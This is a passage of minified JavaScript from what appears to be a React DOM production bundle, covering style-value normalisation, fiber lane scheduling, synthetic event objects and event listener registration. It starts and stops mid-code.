xi={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},Jb=["Webkit","ms","Moz","O"];Object.keys(xi).forEach(function(t){Jb.forEach(function(i){i=i+t.charAt(0).toUpperCase()+t.substring(1),xi[i]=xi[t]})});function Sd(t,i,o){return i==null||typeof i=="boolean"||i===""?"":o||typeof i!="number"||i===0||xi.hasOwnProperty(t)&&xi[t]?(""+i).trim():i+"px"}function Td(t,i){t=t.style;for(var o in i)if(i.hasOwnProperty(o)){var u=o.indexOf("--")===0,h=Sd(o,i[o],u);o==="float"&&(o="cssFloat"),u?t.setProperty(o,h):t[o]=h}}var Qb=J({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function La(t,i){if(i){if(Qb[t]&&(i.children!=null||i.dangerouslySetInnerHTML!=null))throw Error(r(137,t));if(i.dangerouslySetInnerHTML!=null){if(i.children!=null)throw Error(r(60));if(typeof i.dangerouslySetInnerHTML!="object"||!("__html"in i.dangerouslySetInnerHTML))throw Error(r(61))}if(i.style!=null&&typeof i.style!="object")throw Error(r(62))}}function Fa(t,i){if(t.indexOf("-")===-1)return typeof i.is=="string";switch(t){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Ua=null;function za(t){return t=t.target||t.srcElement||window,t.correspondingUseElement&&(t=t.correspondingUseElement),t.nodeType===3?t.parentNode:t}var Va=null,Pr=null,_r=null;function Ad(t){if(t=$i(t)){if(typeof Va!="function")throw Error(r(280));var i=t.stateNode;i&&(i=ro(i),Va(t.stateNode,t.type,i))}}function Cd(t){Pr?_r?_r.push(t):_r=[t]:Pr=t}function Ed(){if(Pr){var t=Pr,i=_r;if(_r=Pr=null,Ad(t),i)for(t=0;t<i.length;t++)Ad(i[t])}}function Pd(t,i){return t(i)}function _d(){}var Wa=!1;function Id(t,i,o){if(Wa)return t(i,o);Wa=!0;try{return Pd(t,i,o)}finally{Wa=!1,(Pr!==null||_r!==null)&&(_d(),Ed())}}function Si(t,i){var o=t.stateNode;if(o===null)return null;var u=ro(o);if(u===null)return null;o=u[i];e:switch(i){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(u=!u.disabled)||(t=t.type,u=!(t==="button"||t==="input"||t==="select"||t==="textarea")),t=!u;break e;default:t=!1}if(t)return null;if(o&&typeof o!="function")throw Error(r(231,i,typeof o));return o}var $a=!1;if(d)try{var Ti={};Object.defineProperty(Ti,"passive",{get:function(){$a=!0}}),window.addEventListener("test",Ti,Ti),window.removeEventListener("test",Ti,Ti)}catch{$a=!1}function Yb(t,i,o,u,h,g,b,S,E){var j=Array.prototype.slice.call(arguments,3);try{i.apply(o,j)}catch(F){this.onError(F)}}var Ai=!1,Ms=null,Bs=!1,Ha=null,Xb={onError:function(t){Ai=!0,Ms=t}};function Zb(t,i,o,u,h,g,b,S,E){Ai=!1,Ms=null,Yb.apply(Xb,arguments)}function ev(t,i,o,u,h,g,b,S,E){if(Zb.apply(this,arguments),Ai){if(Ai){var j=Ms;Ai=!1,Ms=null}else throw Error(r(198));Bs||(Bs=!0,Ha=j)}}function Jn(t){var i=t,o=t;if(t.alternate)for(;i.return;)i=i.return;else{t=i;do i=t,(i.flags&4098)!==0&&(o=i.return),t=i.return;while(t)}return i.tag===3?o:null}function Rd(t){if(t.tag===13){var i=t.memoizedState;if(i===null&&(t=t.alternate,t!==null&&(i=t.memoizedState)),i!==null)return i.dehydrated}return null}function Dd(t){if(Jn(t)!==t)throw Error(r(188))}function tv(t){var i=t.alternate;if(!i){if(i=Jn(t),i===null)throw Error(r(188));return i!==t?null:t}for(var o=t,u=i;;){var h=o.return;if(h===null)break;var g=h.alternate;if(g===null){if(u=h.return,u!==null){o=u;continue}break}if(h.child===g.child){for(g=h.child;g;){if(g===o)return Dd(h),t;if(g===u)return Dd(h),i;g=g.sibling}throw Error(r(188))}if(o.return!==u.return)o=h,u=g;else{for(var b=!1,S=h.child;S;){if(S===o){b=!0,o=h,u=g;break}if(S===u){b=!0,u=h,o=g;break}S=S.sibling}if(!b){for(S=g.child;S;){if(S===o){b=!0,o=g,u=h;break}if(S===u){b=!0,u=g,o=h;break}S=S.sibling}if(!b)throw Error(r(189))}}if(o.alternate!==u)throw Error(r(190))}if(o.tag!==3)throw Error(r(188));return o.stateNode.current===o?t:i}function Od(t){return t=tv(t),t!==null?jd(t):null}function jd(t){if(t.tag===5||t.tag===6)return t;for(t=t.child;t!==null;){var i=jd(t);if(i!==null)return i;t=t.sibling}return null}var Md=e.unstable_scheduleCallback,Bd=e.unstable_cancelCallback,nv=e.unstable_shouldYield,rv=e.unstable_requestPaint,Ue=e.unstable_now,iv=e.unstable_getCurrentPriorityLevel,qa=e.unstable_ImmediatePriority,Nd=e.unstable_UserBlockingPriority,Ns=e.unstable_NormalPriority,sv=e.unstable_LowPriority,Ld=e.unstable_IdlePriority,Ls=null,Jt=null;function ov(t){if(Jt&&typeof Jt.onCommitFiberRoot=="function")try{Jt.onCommitFiberRoot(Ls,t,void 0,(t.current.flags&128)===128)}catch{}}var Lt=Math.clz32?Math.clz32:cv,av=Math.log,lv=Math.LN2;function cv(t){return t>>>=0,t===0?32:31-(av(t)/lv|0)|0}var Fs=64,Us=4194304;function Ci(t){switch(t&-t){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return t&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return t}}function zs(t,i){var o=t.pendingLanes;if(o===0)return 0;var u=0,h=t.suspendedLanes,g=t.pingedLanes,b=o&268435455;if(b!==0){var S=b&~h;S!==0?u=Ci(S):(g&=b,g!==0&&(u=Ci(g)))}else b=o&~h,b!==0?u=Ci(b):g!==0&&(u=Ci(g));if(u===0)return 0;if(i!==0&&i!==u&&(i&h)===0&&(h=u&-u,g=i&-i,h>=g||h===16&&(g&4194240)!==0))return i;if((u&4)!==0&&(u|=o&16),i=t.entangledLanes,i!==0)for(t=t.entanglements,i&=u;0<i;)o=31-Lt(i),h=1<<o,u|=t[o],i&=~h;return u}function uv(t,i){switch(t){case 1:case 2:case 4:return i+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return i+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function dv(t,i){for(var o=t.suspendedLanes,u=t.pingedLanes,h=t.expirationTimes,g=t.pendingLanes;0<g;){var b=31-Lt(g),S=1<<b,E=h[b];E===-1?((S&o)===0||(S&u)!==0)&&(h[b]=uv(S,i)):E<=i&&(t.expiredLanes|=S),g&=~S}}function Ga(t){return t=t.pendingLanes&-1073741825,t!==0?t:t&1073741824?1073741824:0}function Fd(){var t=Fs;return Fs<<=1,(Fs&4194240)===0&&(Fs=64),t}function Ka(t){for(var i=[],o=0;31>o;o++)i.push(t);return i}function Ei(t,i,o){t.pendingLanes|=i,i!==536870912&&(t.suspendedLanes=0,t.pingedLanes=0),t=t.eventTimes,i=31-Lt(i),t[i]=o}function hv(t,i){var o=t.pendingLanes&~i;t.pendingLanes=i,t.suspendedLanes=0,t.pingedLanes=0,t.expiredLanes&=i,t.mutableReadLanes&=i,t.entangledLanes&=i,i=t.entanglements;var u=t.eventTimes;for(t=t.expirationTimes;0<o;){var h=31-Lt(o),g=1<<h;i[h]=0,u[h]=-1,t[h]=-1,o&=~g}}function Ja(t,i){var o=t.entangledLanes|=i;for(t=t.entanglements;o;){var u=31-Lt(o),h=1<<u;h&i|t[u]&i&&(t[u]|=i),o&=~h}}var Te=0;function Ud(t){return t&=-t,1<t?4<t?(t&268435455)!==0?16:536870912:4:1}var zd,Qa,Vd,Wd,$d,Ya=!1,Vs=[],bn=null,vn=null,wn=null,Pi=new Map,_i=new Map,kn=[],pv="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function Hd(t,i){switch(t){case"focusin":case"focusout":bn=null;break;case"dragenter":case"dragleave":vn=null;break;case"mouseover":case"mouseout":wn=null;break;case"pointerover":case"pointerout":Pi.delete(i.pointerId);break;case"gotpointercapture":case"lostpointercapture":_i.delete(i.pointerId)}}function Ii(t,i,o,u,h,g){return t===null||t.nativeEvent!==g?(t={blockedOn:i,domEventName:o,eventSystemFlags:u,nativeEvent:g,targetContainers:[h]},i!==null&&(i=$i(i),i!==null&&Qa(i)),t):(t.eventSystemFlags|=u,i=t.targetContainers,h!==null&&i.indexOf(h)===-1&&i.push(h),t)}function fv(t,i,o,u,h){switch(i){case"focusin":return bn=Ii(bn,t,i,o,u,h),!0;case"dragenter":return vn=Ii(vn,t,i,o,u,h),!0;case"mouseover":return wn=Ii(wn,t,i,o,u,h),!0;case"pointerover":var g=h.pointerId;return Pi.set(g,Ii(Pi.get(g)||null,t,i,o,u,h)),!0;case"gotpointercapture":return g=h.pointerId,_i.set(g,Ii(_i.get(g)||null,t,i,o,u,h)),!0}return!1}function qd(t){var i=Qn(t.target);if(i!==null){var o=Jn(i);if(o!==null){if(i=o.tag,i===13){if(i=Rd(o),i!==null){t.blockedOn=i,$d(t.priority,function(){Vd(o)});return}}else if(i===3&&o.stateNode.current.memoizedState.isDehydrated){t.blockedOn=o.tag===3?o.stateNode.containerInfo:null;return}}}t.blockedOn=null}function Ws(t){if(t.blockedOn!==null)return!1;for(var i=t.targetContainers;0<i.length;){var o=Za(t.domEventName,t.eventSystemFlags,i[0],t.nativeEvent);if(o===null){o=t.nativeEvent;var u=new o.constructor(o.type,o);Ua=u,o.target.dispatchEvent(u),Ua=null}else return i=$i(o),i!==null&&Qa(i),t.blockedOn=o,!1;i.shift()}return!0}function Gd(t,i,o){Ws(t)&&o.delete(i)}function gv(){Ya=!1,bn!==null&&Ws(bn)&&(bn=null),vn!==null&&Ws(vn)&&(vn=null),wn!==null&&Ws(wn)&&(wn=null),Pi.forEach(Gd),_i.forEach(Gd)}function Ri(t,i){t.blockedOn===i&&(t.blockedOn=null,Ya||(Ya=!0,e.unstable_scheduleCallback(e.unstable_NormalPriority,gv)))}function Di(t){function i(h){return Ri(h,t)}if(0<Vs.length){Ri(Vs[0],t);for(var o=1;o<Vs.length;o++){var u=Vs[o];u.blockedOn===t&&(u.blockedOn=null)}}for(bn!==null&&Ri(bn,t),vn!==null&&Ri(vn,t),wn!==null&&Ri(wn,t),Pi.forEach(i),_i.forEach(i),o=0;o<kn.length;o++)u=kn[o],u.blockedOn===t&&(u.blockedOn=null);for(;0<kn.length&&(o=kn[0],o.blockedOn===null);)qd(o),o.blockedOn===null&&kn.shift()}var Ir=M.ReactCurrentBatchConfig,$s=!0;function mv(t,i,o,u){var h=Te,g=Ir.transition;Ir.transition=null;try{Te=1,Xa(t,i,o,u)}finally{Te=h,Ir.transition=g}}function yv(t,i,o,u){var h=Te,g=Ir.transition;Ir.transition=null;try{Te=4,Xa(t,i,o,u)}finally{Te=h,Ir.transition=g}}function Xa(t,i,o,u){if($s){var h=Za(t,i,o,u);if(h===null)ml(t,i,u,Hs,o),Hd(t,u);else if(fv(h,t,i,o,u))u.stopPropagation();else if(Hd(t,u),i&4&&-1<pv.indexOf(t)){for(;h!==null;){var g=$i(h);if(g!==null&&zd(g),g=Za(t,i,o,u),g===null&&ml(t,i,u,Hs,o),g===h)break;h=g}h!==null&&u.stopPropagation()}else ml(t,i,u,null,o)}}var Hs=null;function Za(t,i,o,u){if(Hs=null,t=za(u),t=Qn(t),t!==null)if(i=Jn(t),i===null)t=null;else if(o=i.tag,o===13){if(t=Rd(i),t!==null)return t;t=null}else if(o===3){if(i.stateNode.current.memoizedState.isDehydrated)return i.tag===3?i.stateNode.containerInfo:null;t=null}else i!==t&&(t=null);return Hs=t,null}function Kd(t){switch(t){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(iv()){case qa:return 1;case Nd:return 4;case Ns:case sv:return 16;case Ld:return 536870912;default:return 16}default:return 16}}var xn=null,el=null,qs=null;function Jd(){if(qs)return qs;var t,i=el,o=i.length,u,h="value"in xn?xn.value:xn.textContent,g=h.length;for(t=0;t<o&&i[t]===h[t];t++);var b=o-t;for(u=1;u<=b&&i[o-u]===h[g-u];u++);return qs=h.slice(t,1<u?1-u:void 0)}function Gs(t){var i=t.keyCode;return"charCode"in t?(t=t.charCode,t===0&&i===13&&(t=13)):t=i,t===10&&(t=13),32<=t||t===13?t:0}function Ks(){return!0}function Qd(){return!1}function xt(t){function i(o,u,h,g,b){this._reactName=o,this._targetInst=h,this.type=u,this.nativeEvent=g,this.target=b,this.currentTarget=null;for(var S in t)t.hasOwnProperty(S)&&(o=t[S],this[S]=o?o(g):g[S]);return this.isDefaultPrevented=(g.defaultPrevented!=null?g.defaultPrevented:g.returnValue===!1)?Ks:Qd,this.isPropagationStopped=Qd,this}return J(i.prototype,{preventDefault:function(){this.defaultPrevented=!0;var o=this.nativeEvent;o&&(o.preventDefault?o.preventDefault():typeof o.returnValue!="unknown"&&(o.returnValue=!1),this.isDefaultPrevented=Ks)},stopPropagation:function(){var o=this.nativeEvent;o&&(o.stopPropagation?o.stopPropagation():typeof o.cancelBubble!="unknown"&&(o.cancelBubble=!0),this.isPropagationStopped=Ks)},persist:function(){},isPersistent:Ks}),i}var Rr={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(t){return t.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},tl=xt(Rr),Oi=J({},Rr,{view:0,detail:0}),bv=xt(Oi),nl,rl,ji,Js=J({},Oi,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:sl,button:0,buttons:0,relatedTarget:function(t){return t.relatedTarget===void 0?t.fromElement===t.srcElement?t.toElement:t.fromElement:t.relatedTarget},movementX:function(t){return"movementX"in t?t.movementX:(t!==ji&&(ji&&t.type==="mousemove"?(nl=t.screenX-ji.screenX,rl=t.screenY-ji.screenY):rl=nl=0,ji=t),nl)},movementY:function(t){return"movementY"in t?t.movementY:rl}}),Yd=xt(Js),vv=J({},Js,{dataTransfer:0}),wv=xt(vv),kv=J({},Oi,{relatedTarget:0}),il=xt(kv),xv=J({},Rr,{animationName:0,elapsedTime:0,pseudoElement:0}),Sv=xt(xv),Tv=J({},Rr,{clipboardData:function(t){return"clipboardData"in t?t.clipboardData:window.clipboardData}}),Av=xt(Tv),Cv=J({},Rr,{data:0}),Xd=xt(Cv),Ev={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},Pv={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},_v={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Iv(t){var i=this.nativeEvent;return i.getModifierState?i.getModifierState(t):(t=_v[t])?!!i[t]:!1}function sl(){return Iv}var Rv=J({},Oi,{key:function(t){if(t.key){var i=Ev[t.key]||t.key;if(i!=="Unidentified")return i}return t.type==="keypress"?(t=Gs(t),t===13?"Enter":String.fromCharCode(t)):t.type==="keydown"||t.type==="keyup"?Pv[t.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:sl,charCode:function(t){return t.type==="keypress"?Gs(t):0},keyCode:function(t){return t.type==="keydown"||t.type==="keyup"?t.keyCode:0},which:function(t){return t.type==="keypress"?Gs(t):t.type==="keydown"||t.type==="keyup"?t.keyCode:0}}),Dv=xt(Rv),Ov=J({},Js,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),Zd=xt(Ov),jv=J({},Oi,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:sl}),Mv=xt(jv),Bv=J({},Rr,{propertyName:0,elapsedTime:0,pseudoElement:0}),Nv=xt(Bv),Lv=J({},Js,{deltaX:function(t){return"deltaX"in t?t.deltaX:"wheelDeltaX"in t?-t.wheelDeltaX:0},deltaY:function(t){return"deltaY"in t?t.deltaY:"wheelDeltaY"in t?-t.wheelDeltaY:"wheelDelta"in t?-t.wheelDelta:0},deltaZ:0,deltaMode:0}),Fv=xt(Lv),Uv=[9,13,27,32],ol=d&&"CompositionEvent"in window,Mi=null;d&&"documentMode"in document&&(Mi=document.documentMode);var zv=d&&"TextEvent"in window&&!Mi,eh=d&&(!ol||Mi&&8<Mi&&11>=Mi),th=" ",nh=!1;function rh(t,i){switch(t){case"keyup":return Uv.indexOf(i.keyCode)!==-1;case"keydown":return i.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function ih(t){return t=t.detail,typeof t=="object"&&"data"in t?t.data:null}var Dr=!1;function Vv(t,i){switch(t){case"compositionend":return ih(i);case"keypress":return i.which!==32?null:(nh=!0,th);case"textInput":return t=i.data,t===th&&nh?null:t;default:return null}}function Wv(t,i){if(Dr)return t==="compositionend"||!ol&&rh(t,i)?(t=Jd(),qs=el=xn=null,Dr=!1,t):null;switch(t){case"paste":return null;case"keypress":if(!(i.ctrlKey||i.altKey||i.metaKey)||i.ctrlKey&&i.altKey){if(i.char&&1<i.char.length)return i.char;if(i.which)return String.fromCharCode(i.which)}return null;case"compositionend":return eh&&i.locale!=="ko"?null:i.data;default:return null}}var $v={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function sh(t){var i=t&&t.nodeName&&t.nodeName.toLowerCase();return i==="input"?!!$v[t.type]:i==="textarea"}function oh(t,i,o,u){Cd(u),i=eo(i,"onChange"),0<i.length&&(o=new tl("onChange","change",null,o,u),t.push({event:o,listeners:i}))}var Bi=null,Ni=null;function Hv(t){Th(t,0)}function Qs(t){var i=Nr(t);if(Da(i))return t}function qv(t,i){if(t==="change")return i}var ah=!1;if(d){var al;if(d){var ll="oninput"in document;if(!ll){var lh=document.createElement("div");lh.setAttribute("oninput","return;"),ll=typeof lh.oninput=="function"}al=ll}else al=!1;ah=al&&(!document.documentMode||9<document.documentMode)}function ch(){Bi&&(Bi.detachEvent("onpropertychange",uh),Ni=Bi=null)}function uh(t){if(t.propertyName==="value"&&Qs(Ni)){var i=[];oh(i,Ni,t,za(t)),Id(Hv,i)}}function Gv(t,i,o){t==="focusin"?(ch(),Bi=i,Ni=o,Bi.attachEvent("onpropertychange",uh)):t==="focusout"&&ch()}function Kv(t){if(t==="selectionchange"||t==="keyup"||t==="keydown")return Qs(Ni)}function Jv(t,i){if(t==="click")return Qs(i)}function Qv(t,i){if(t==="input"||t==="change")return Qs(i)}function Yv(t,i){return t===i&&(t!==0||1/t===1/i)||t!==t&&i!==i}var Ft=typeof Object.is=="function"?Object.is:Yv;function Li(t,i){if(Ft(t,i))return!0;if(typeof t!="object"||t===null||typeof i!="object"||i===null)return!1;var o=Object.keys(t),u=Object.keys(i);if(o.length!==u.length)return!1;for(u=0;u<o.length;u++){var h=o[u];if(!p.call(i,h)||!Ft(t[h],i[h]))return!1}return!0}function dh(t){for(;t&&t.firstChild;)t=t.firstChild;return t}function hh(t,i){var o=dh(t);t=0;for(var u;o;){if(o.nodeType===3){if(u=t+o.textContent.length,t<=i&&u>=i)return{node:o,offset:i-t};t=u}e:{for(;o;){if(o.nextSibling){o=o.nextSibling;break e}o=o.parentNode}o=void 0}o=dh(o)}}function ph(t,i){return t&&i?t===i?!0:t&&t.nodeType===3?!1:i&&i.nodeType===3?ph(t,i.parentNode):"contains"in t?t.contains(i):t.compareDocumentPosition?!!(t.compareDocumentPosition(i)&16):!1:!1}function fh(){for(var t=window,i=Os();i instanceof t.HTMLIFrameElement;){try{var o=typeof i.contentWindow.location.href=="string"}catch{o=!1}if(o)t=i.contentWindow;else break;i=Os(t.document)}return i}function cl(t){var i=t&&t.nodeName&&t.nodeName.toLowerCase();return i&&(i==="input"&&(t.type==="text"||t.type==="search"||t.type==="tel"||t.type==="url"||t.type==="password")||i==="textarea"||t.contentEditable==="true")}function Xv(t){var i=fh(),o=t.focusedElem,u=t.selectionRange;if(i!==o&&o&&o.ownerDocument&&ph(o.ownerDocument.documentElement,o)){if(u!==null&&cl(o)){if(i=u.start,t=u.end,t===void 0&&(t=i),"selectionStart"in o)o.selectionStart=i,o.selectionEnd=Math.min(t,o.value.length);else if(t=(i=o.ownerDocument||document)&&i.defaultView||window,t.getSelection){t=t.getSelection();var h=o.textContent.length,g=Math.min(u.start,h);u=u.end===void 0?g:Math.min(u.end,h),!t.extend&&g>u&&(h=u,u=g,g=h),h=hh(o,g);var b=hh(o,u);h&&b&&(t.rangeCount!==1||t.anchorNode!==h.node||t.anchorOffset!==h.offset||t.focusNode!==b.node||t.focusOffset!==b.offset)&&(i=i.createRange(),i.setStart(h.node,h.offset),t.removeAllRanges(),g>u?(t.addRange(i),t.extend(b.node,b.offset)):(i.setEnd(b.node,b.offset),t.addRange(i)))}}for(i=[],t=o;t=t.parentNode;)t.nodeType===1&&i.push({element:t,left:t.scrollLeft,top:t.scrollTop});for(typeof o.focus=="function"&&o.focus(),o=0;o<i.length;o++)t=i[o],t.element.scrollLeft=t.left,t.element.scrollTop=t.top}}var Zv=d&&"documentMode"in document&&11>=document.documentMode,Or=null,ul=null,Fi=null,dl=!1;function gh(t,i,o){var u=o.window===o?o.document:o.nodeType===9?o:o.ownerDocument;dl||Or==null||Or!==Os(u)||(u=Or,"selectionStart"in u&&cl(u)?u={start:u.selectionStart,end:u.selectionEnd}:(u=(u.ownerDocument&&u.ownerDocument.defaultView||window).getSelection(),u={anchorNode:u.anchorNode,anchorOffset:u.anchorOffset,focusNode:u.focusNode,focusOffset:u.focusOffset}),Fi&&Li(Fi,u)||(Fi=u,u=eo(ul,"onSelect"),0<u.length&&(i=new tl("onSelect","select",null,i,o),t.push({event:i,listeners:u}),i.target=Or)))}function Ys(t,i){var o={};return o[t.toLowerCase()]=i.toLowerCase(),o["Webkit"+t]="webkit"+i,o["Moz"+t]="moz"+i,o}var jr={animationend:Ys("Animation","AnimationEnd"),animationiteration:Ys("Animation","AnimationIteration"),animationstart:Ys("Animation","AnimationStart"),transitionend:Ys("Transition","TransitionEnd")},hl={},mh={};d&&(mh=document.createElement("div").style,"AnimationEvent"in window||(delete jr.animationend.animation,delete jr.animationiteration.animation,delete jr.animationstart.animation),"TransitionEvent"in window||delete jr.transitionend.transition);function Xs(t){if(hl[t])return hl[t];if(!jr[t])return t;var i=jr[t],o;for(o in i)if(i.hasOwnProperty(o)&&o in mh)return hl[t]=i[o];return t}var yh=Xs("animationend"),bh=Xs("animationiteration"),vh=Xs("animationstart"),wh=Xs("transitionend"),kh=new Map,xh="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function Sn(t,i){kh.set(t,i),l(i,[t])}for(var pl=0;pl<xh.length;pl++){var fl=xh[pl],ew=fl.toLowerCase(),tw=fl[0].toUpperCase()+fl.slice(1);Sn(ew,"on"+tw)}Sn(yh,"onAnimationEnd"),Sn(bh,"onAnimationIteration"),Sn(vh,"onAnimationStart"),Sn("dblclick","onDoubleClick"),Sn("focusin","onFocus"),Sn("focusout","onBlur"),Sn(wh,"onTransitionEnd"),c("onMouseEnter",["mouseout","mouseover"]),c("onMouseLeave",["mouseout","mouseover"]),c("onPointerEnter",["pointerout","pointerover"]),c("onPointerLeave",["pointerout","pointerover"]),l("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),l("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),l("onBeforeInput",["compositionend","keypress","textInput","paste"]),l("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),l("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),l("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Ui="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),nw=new Set("cancel close invalid load scroll toggle".split(" ").concat(Ui));function Sh(t,i,o){var u=t.type||"unknown-event";t.currentTarget=o,ev(u,i,void 0,t),t.currentTarget=null}function Th(t,i){i=(i&4)!==0;for(var o=0;o<t.length;o++){var u=t[o],h=u.event;u=u.listeners;e:{var g=void 0;if(i)for(var b=u.length-1;0<=b;b--){var S=u[b],E=S.instance,j=S.currentTarget;if(S=S.listener,E!==g&&h.isPropagationStopped())break e;Sh(h,S,j),g=E}else for(b=0;b<u.length;b++){if(S=u[b],E=S.instance,j=S.currentTarget,S=S.listener,E!==g&&h.isPropagationStopped())break e;Sh(h,S,j),g=E}}}if(Bs)throw t=Ha,Bs=!1,Ha=null,t}function Re(t,i){var o=i[xl];o===void 0&&(o=i[xl]=new Set);var u=t+"__bubble";o.has(u)||(Ah(i,t,2,!1),o.add(u))}function gl(t,i,o){var u=0;i&&(u|=4),Ah(o,t,u,i)}var Zs="_reactListening"+Math.random().toString(36).slice(2);function zi(t){if(!t[Zs]){t[Zs]=!0,s.forEach(function(o){o!=="selectionchange"&&(nw.has(o)||gl(o,!1,t),gl(o,!0,t))});var i=t.nodeType===9?t:t.ownerDocument;i===null||i[Zs]||(i[Zs]=!0,gl("selectionchange",!1,i))}}function Ah(t,i,o,u){switch(Kd(i)){case 1:var h=mv;break;case 4:h=yv;break;default:h=Xa}o=h.bind(null,i,o,t),h=void 0,!$a||i!=="touchstart"&&i!=="touchmove"&&i!=="wheel"||(h=!0),u?h!==void 0?t.addEventListener(i,o,{capture:!0,passive:h}):t.addEventListener(i,o,!0):h!==void 0?t.addEventListener(i,o,{passive:h}):t.addEventListener(i,o,!1)}function ml(t,i,o,u,h){var g=u;if((i&1)===0&&(i&2)===0&&u!==null)e:for(;;){if(u===null)return;var b=u.tag;if(b===3||b===4){var S=u.stateNode.containerInfo;if(S===h||S.nodeType===8&&S.parentNode===h)break;if(b===4)for(b=u.return;b!==null;){var E=b.tag;if((E===3||E===4)&&(E=b.stateNode.containerInfo,E===h||E.nodeType===8&&E.parentNode===h))return;b=b.return}for(;S!==null;){if(b=Qn(S),b===null)return;if(E=b.tag,E===5||E===6){u=g=b;continue e}S=S.parentNode}}u=u.return}Id(function(){var 